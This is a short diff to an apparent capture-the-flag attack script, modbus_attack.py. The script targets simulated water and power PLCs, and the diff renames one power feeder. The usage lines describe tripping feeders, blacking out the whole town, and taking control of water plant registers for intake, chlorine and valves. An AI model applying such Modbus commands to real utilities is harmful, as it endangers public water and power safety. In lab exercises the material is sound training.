@@ -6,7 +6,7 @@
     modbus_attack.py water flag           # set maint mode, read + decode the flag block
     modbus_attack.py water restore
 
-    modbus_attack.py power trip <feeder>  # feeder: residential|downtown|industrial|streetlights
+    modbus_attack.py power trip <feeder>  # feeder: residential|business|industrial|streetlights
     modbus_attack.py power trip-main      # open the main incomer -> whole town dark
     modbus_attack.py power flag
     modbus_attack.py power restore
@@ -26,8 +26,8 @@ HOST = "field-plc"
 WATER_PORT, POWER_PORT = 502, 503
 
 W = dict(INTAKE=0, HIGHLIFT=1, CHLORINE=2, MAIN_VALVE=3, MAINT=8, HIGHLIFT_SP=0, CHLORINE_SP=1)
-P = dict(MAIN=0, RES=1, DT=2, IND=3, ST=4, GEN=5, MAINT=8, GEN_SP=0)
-FEEDER = {"residential": P["RES"], "downtown": P["DT"], "industrial": P["IND"], "streetlights": P["ST"]}
+P = dict(MAIN=0, RES=1, BIZ=2, IND=3, ST=4, GEN=5, MAINT=8, GEN_SP=0)
+FEEDER = {"residential": P["RES"], "business": P["BIZ"], "industrial": P["IND"], "streetlights": P["ST"]}
 FLAG_BASE, FLAG_LEN = 100, 32
 
 
